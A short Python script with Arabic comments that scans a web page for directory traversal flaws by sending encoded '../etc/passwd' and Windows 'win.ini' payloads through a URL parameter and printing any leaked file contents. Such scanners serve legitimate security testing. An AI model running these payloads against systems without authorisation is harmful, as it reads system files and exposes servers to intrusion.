import requests
from rich.console import Console
from urllib.parse import urljoin

console = Console()

def scan_directory_traversal(url, param_name="file"):
    """
    🔍 فحص ثغرات اجتياز المجلدات (Directory Traversal).

    Args:
        url (str): رابط الموقع الذي سيتم فحصه.
        param_name (str): اسم المتغير في الرابط الذي سيتم حقنه (مثل: file, path).

    Example:
        scan_directory_traversal("https://example.com/page.php", "file")
    """
    # قائمة بأنماط اجتياز المجلدات الشائعة
    payloads = [
        "../../../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    ]

    console.print(f"[cyan]🔍 بدء فحص اجتياز المجلدات في: {url}[/cyan]")

    for payload in payloads:
        target_url = f"{url}?{param_name}={payload}"

        try:
            response = requests.get(target_url, timeout=5)

            # التحقق من وجود محتوى ملف حساس في الاستجابة
            if "root:x:0:0:" in response.text or "[extensions]" in response.text:
                console.print(f"[red]❌ ثغرة اجتياز المجلدات مكتشفة في: {target_url}[/red]")
                console.print(f"[yellow]📂 استجابة الخادم:\n{response.text[:500]}[/yellow]")
                return
            else:
                console.print(f"[green]✅ {payload} لم يكشف عن أي ثغرات.[/green]")

        except requests.RequestException:
            console.print(f"[yellow]⚠️ تعذر الوصول إلى: {target_url}[/yellow]")

    console.print("[bold green]✅ تم الانتهاء من الفحص. لم يتم العثور على أي ثغرات اجتياز المجلدات.[/bold green]")
